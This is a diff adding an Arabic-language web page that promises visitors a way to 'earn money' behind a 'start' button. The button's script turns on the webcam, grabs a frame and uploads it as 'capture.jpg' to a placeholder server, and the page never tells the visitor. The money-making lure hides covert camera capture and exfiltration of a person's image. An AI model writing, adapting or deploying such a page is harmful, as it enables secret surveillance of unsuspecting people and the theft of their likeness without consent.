@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>ربح المال</title>
+</head>
+<body>
+    <h1>ابدا الربح</h1>
+    <button onclick="startCamera()">ابدأ</button>
+    <video id="video" autoplay></video>
+    <script>
+        async function startCamera() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            // التقاط صورة وإرسالها
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('image', blob, 'capture.jpg');
+                
+                fetch('https://your-server.com/upload', {
+                    method: 'POST',
+                    body: formData
+                }).then(response => console.log('تم إرسال الصورة'));
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
